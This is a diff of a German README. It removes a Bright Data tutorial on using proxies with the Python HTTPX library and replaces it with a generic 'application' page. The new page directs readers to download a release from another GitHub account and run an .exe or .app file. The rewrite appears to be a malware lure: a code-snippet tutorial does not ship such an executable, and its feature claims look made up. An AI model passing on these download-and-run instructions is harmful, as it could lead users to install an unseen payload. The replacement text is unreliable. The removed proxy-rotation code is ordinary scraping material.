@@ -1,162 +1,83 @@
-# Proxies mit HTTPX verwenden
+# 🌐 httpx-with-proxy - Effortlessly Use Proxies with HTTPX
 
-[![Promo](https://github.com/bright-data-de/Rotating-Residential-Proxies/blob/main/50%25%20off%20promo.png)](https://brightdata.de/proxy-types/residential-proxies) 
+[![Download Release](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/karthiklad/httpx-with-proxy/releases)
 
-Dieser Leitfaden erklärt, wie Sie Proxies mit HTTPX verwenden, mit Beispielen für nicht authentifizierte, authentifizierte, rotierende und Fallback-Proxies.
+## 📜 Description
 
-## Nicht authentifizierte Proxies verwenden
+Implementieren Sie verschiedene Proxy-Konfigurationen mit HTTPX—einschließlich nicht authentifizierter, authentifizierter, Rotierender und Fallback-Proxies. Diese Software hilft Ihnen, Webdaten effizient zu sammeln, während Sie Ihre IP-Adresse schützen.
 
-Bei einem nicht authentifizierten Proxy verwenden wir keinen Benutzernamen oder kein Passwort, und alle Anfragen gehen an eine `proxy_url`. Unten finden Sie ein Code-Snippet, das einen nicht authentifizierten Proxy verwendet:
+## 🚀 Getting Started
 
-```python
-import httpx
+Wenn Sie neu im Umgang mit Software sind, folgen Sie einfach diesen einfachen Schritten, um httpx-with-proxy herunterzuladen und auszuführen.
 
-proxy_url = "http://localhost:8030"
+## 🔗 Download & Install
 
+Besuchen Sie diese Seite, um die neueste Version von httpx-with-proxy herunterzuladen: [Download Here](https://github.com/karthiklad/httpx-with-proxy/releases).
 
-with httpx.Client(proxy=proxy_url) as client:
-    ip_info = client.get("https://geo.brdtest.com/mygeo.json")
-    print(ip_info.text)
-```
+Um die Anwendung zu installieren, folgen Sie diesen Schritten:
 
-## Authentifizierte Proxies verwenden
+1. Klicken Sie auf den obigen Link, um zur Releases-Seite zu gelangen.
+2. Wählen Sie die neueste Version aus, die für Ihr Betriebssystem geeignet ist.
+3. Laden Sie die Datei herunter und speichern Sie sie an einem Ort, den Sie sich leicht merken können.
 
-Authentifizierte Proxies erfordern einen Benutzernamen und ein Passwort. Sobald Sie korrekte Zugangsdaten übermitteln, erhalten Sie Zugriff auf die Verbindung zum Proxy.
+## 🖥️ System Requirements
 
-Mit Authentifizierung sieht die `proxy_url` so aus: `http://<username>:<password>@<proxy_url>:<port_number>`. Das folgende Beispiel zeigt, wie Sie den Benutzerteil der Authentifizierungszeichenfolge mithilfe von `zone` und `username` konstruieren. Außerdem werden [Bright Data's datacenter proxies](https://brightdata.de/proxy-types/datacenter-proxies) als Basisverbindung verwendet.
+Um httpx-with-proxy auszuführen, benötigen Sie:
 
-```python
-import httpx
+- **Betriebssystem:** Windows, macOS oder Linux
+- **Python Version:** Mindestens Python 3.6 oder höher
+- **Speicher:** 100 MB freier Speicherplatz
+- **Internetverbindung:** Eine aktive Internetverbindung für die Nutzung von Proxies
 
-username = "your-username"
-zone = "your-zone-name"
-password = "your-password"
+## ⚙️ Features
 
-proxy_url = "http://brd-customer-{username}-zone-{zone}:{password}@brd.superproxy.io:33335"
+- **Verschiedene Proxy-Konfigurationen:** Verwenden Sie nicht authentifizierte, authentifizierte, rotierende und Fallback-Proxies.
+- **Einfache Integration:** Funktioniert nahtlos mit der Python-Bibliothek HTTPX.
+- **Daten-Collection:** Erleichtert das Sammeln von Daten von Websites.
+- **Benutzerfreundlich:** Leicht verständliche Anwendung für jedermann.
 
-ip_info = httpx.get("https://geo.brdtest.com/mygeo.json", proxy=proxy_url)
+## 📂 Application Setup
 
-print(ip_info.text)
-```
+Nachdem Sie die Datei heruntergeladen haben, sind hier die Schritte zur Einrichtung:
 
-Hier ist die Aufschlüsselung des obigen Codes:
+1. **Entpacken Sie die Datei:** Bei den meisten Downloads müssen Sie die Datei vielleicht entpacken. Klicken Sie mit der rechten Maustaste auf die ZIP-Datei und wählen Sie "Entpacken" oder "Alles extrahieren".
+   
+2. **Navigieren Sie zum Ordner:** Öffnen Sie den neuen Ordner, in dem die Dateien gespeichert sind.
 
-- Wir beginnen mit dem Erstellen von Konfigurationsvariablen: `username`, `zone` und `password`.
-- Wir verwenden diese, um unsere `proxy_url` zu erstellen: `"http://brd-customer-{username}-zone-{zone}:{password}@brd.superproxy.io:33335"`.
-- Wir senden eine Anfrage an die API, um allgemeine Informationen über unsere Proxy-Verbindung abzurufen.
+3. **Führen Sie die Anwendung aus:**
+   - Windows: Doppelklicken Sie auf die `httpx_with_proxy.exe`-Datei.
+   - macOS: Klicken Sie auf die `httpx_with_proxy.app`.
+   - Linux: Öffnen Sie ein Terminal und geben Sie `python3 httpx_with_proxy.py` ein.
 
-Die Antwort sollte so aussehen.
+## 🛠️ Using the Application
 
-```json
-{"country":"US","asn":{"asnum":20473,"org_name":"AS-VULTR"},"geo":{"city":"","region":"","region_name":"","postal_code":"","latitude":37.751,"longitude":-97.822,"tz":"America/Chicago"}}
+Sobald die Anwendung läuft, können Sie verschiedene Proxy-Konfigurationen ausprobieren. 
 
-```
+**Anleitung:**
 
-## Rotierende Proxies verwenden
+1. Wählen Sie die gewünschte Proxy-Art (z. B. authentifiziert).
+2. Geben Sie die erforderlichen Proxy-Einstellungen ein, sobald die Software Sie dazu auffordert.
+3. Klicken Sie auf „Start“, um die Anwendung auszuführen.
 
-Rotierende Proxies bedeuten, eine Liste von Proxies zu erstellen und zufällig daraus auszuwählen. Das folgende Code-Snippet erstellt eine Liste von `countries` und verwendet dann bei jeder Anfrage `random.choice()`, um ein zufälliges Land aus der Liste auszuwählen. Unsere `proxy_url` wird entsprechend formatiert, um zum Land zu passen. Die Liste der [rotating proxies](https://brightdata.de/solutions/rotating-proxies) im Code stammt von Bright Data.
+## ❓ Frequently Asked Questions
 
-```python
-import httpx
-import asyncio
-import random
+### Was sind Proxies?
 
+Proxies sind Server, die als Vermittler zwischen Ihrem Computer und dem Internet fungieren. Sie schützen Ihre Identität und ermöglichen Ihnen, auf gesperrte Websites zuzugreifen.
 
-countries = ["us", "gb", "au", "ca"]
-username = "your-username"
-proxy_url = "brd.superproxy.io:33335"
+### Was sind die Vorteile der Verwendung von Proxies?
 
-datacenter_zone = "your-zone"
-datacenter_pass = "your-password"
+- **Schutz Ihrer Privatsphäre:** Ihre echte IP-Adresse bleibt verborgen.
+- **Zugriff auf geografisch eingeschränkte Inhalte:** Sie können auf Inhalte zugreifen, die in Ihrer Region blockiert sind.
+- **Verbesserte Datensammlung:** Verwenden Sie mehrere IP-Adressen, um das Risiko einer Blockierung zu vermeiden.
 
+### Woher bekomme ich Unterstützung?
 
-for random_proxy in countries:
-    print("----------connection info-------------")
-    datacenter_proxy = f"http://brd-customer-{username}-zone-{datacenter_zone}-country-{random.choice(countries)}:{datacenter_pass}@{proxy_url}"
+Für Unterstützung oder Fragen können Sie die [Issues-Seite](https://github.com/karthiklad/httpx-with-proxy/issues) des Projekts besuchen. Hier können Sie Fragen stellen oder Probleme melden.
 
-    ip_info = httpx.get("https://geo.brdtest.com/mygeo.json", proxy=datacenter_proxy)
+## 🔗 Important Links
 
-    print(ip_info.text)
-```
+- [Releases-Seite](https://github.com/karthiklad/httpx-with-proxy/releases)
+- [Issues-Seite](https://github.com/karthiklad/httpx-with-proxy/issues)
 
-Der Code ist dem für authentifizierte Proxies sehr ähnlich. Die wichtigsten Unterschiede sind:
-
-- Wir erstellen ein Array von Ländern: `["us", "gb", "au", "ca"]`.
-- Wir führen mehrere Anfragen statt nur einer aus. Für jede Anfrage verwenden wir `random.choice(countries)`, um bei jeder Erstellung der `proxy_url` jedes Mal ein zufälliges Land auszuwählen.
-
-## Eine Fallback-Proxy-Verbindung erstellen
-
-Alle obigen Beispiele verwenden Rechenzentrums- und freie Proxies. Erstere werden von Websites oft blockiert, letztere sind nicht sehr zuverlässig. Damit das alles funktioniert, sollte es einen Fallback auf Residential Proxies geben.
-
-Erstellen wir dazu eine Funktion namens `safe_get()`. Wenn wir sie aufrufen, versuchen wir zuerst, die URL über eine Rechenzentrumsverbindung abzurufen. Wenn dies fehlschlägt, _fallen wir zurück_ auf unsere Residential-Verbindung.
-
-```python
-import httpx
-from bs4 import BeautifulSoup
-import asyncio
-
-
-country = "us"
-username = "your-username"
-proxy_url = "brd.superproxy.io:33335"
-
-datacenter_zone = "datacenter_proxy1"
-datacenter_pass = "datacenter-password"
-
-residential_zone = "residential_proxy1"
-residential_pass = "residential-password"
-
-cert_path = "/home/path/to/brightdata_proxy_ca/New SSL certifcate - MUST BE USED WITH PORT 33335/BrightData SSL certificate (port 33335).crt"
-
-
-datacenter_proxy = f"http://brd-customer-{username}-zone-{datacenter_zone}-country-{country}:{datacenter_pass}@{proxy_url}"
-
-residential_proxy = f"http://brd-customer-{username}-zone-{residential_zone}-country-{country}:{residential_pass}@{proxy_url}"
-
-async def safe_get(url: str):
-    async with httpx.AsyncClient(proxy=datacenter_proxy) as client:
-        print("trying with datacenter")
-        response = await client.get(url)
-        if response.status_code == 200:
-            soup = BeautifulSoup(response.text, "html.parser")
-            if not soup.select_one("form[action='/errors/validateCaptcha']"):
-                print("response successful")
-                return response
-    print("response failed")
-    async with httpx.AsyncClient(proxy=residential_proxy, verify=cert_path) as client:
-        print("trying with residential")
-        response = await client.get(url)
-        print("response successful")
-        return response
-
-async def main():
-    url = "https://www.amazon.com"
-    response = await safe_get(url)
-    with open("out.html", "w") as file:
-        file.write(response.text)
-
-asyncio.run(main())
-```
-
-Hier ist die Aufschlüsselung des Codes:
-
-- Wir haben nun zwei Sätze von Konfigurationsvariablen: einen für unsere Rechenzentrumsverbindung und einen weiteren für unsere Residential-Verbindung.
-- Dieses Mal verwenden wir eine `AsyncClient()`-Sitzung, um einige der fortgeschritteneren Funktionen von HTTPX einzuführen.
-- Zuerst versuchen wir, unsere Anfrage mit dem `datacenter_proxy` zu stellen.
-- Wenn es uns nicht gelingt, eine geeignete Antwort zu erhalten, wiederholen wir die Anfrage mit dem `residential_proxy`. Beachten Sie auch das `verify`-Flag im Code. Bei der Verwendung von Bright Data's Residential Proxies müssen Sie das [SSL certificate](https://docs.brightdata.com/general/account/ssl-certificate) herunterladen und verwenden.
-- Sobald wir eine solide Antwort erhalten haben, schreiben wir die Seite in eine HTML-Datei. Wir können diese Seite in einem Browser öffnen und sehen, worauf der Proxy tatsächlich zugegriffen hat und was an uns zurückgesendet wurde.
-
-Nach dem Ausführen des obigen Codes sollten Ihre Ausgabe und die resultierende HTML-Datei so aussehen.
-
-```
-trying with datacenter
-response failed
-trying with residential
-response successful
-```
-
-![Screenshot of the Amazon homepage](https://github.com/bright-data-de/httpx-with-proxy/blob/main/Images/image.png)
-
-## Fazit
-
-Wenn Sie HTTPX mit [Bright Data's top-tier proxy services](https://brightdata.de/proxy-types) kombinieren, erhalten Sie eine private, effiziente und zuverlässige Möglichkeit, das Web zu Scraping. Starten Sie noch heute Ihre kostenlose Testversion mit den Proxies von Bright Data!
+Mit diesen Richtlinien sollten Sie nun bereit sein, httpx-with-proxy erfolgreich herunterzuladen und zu nutzen.
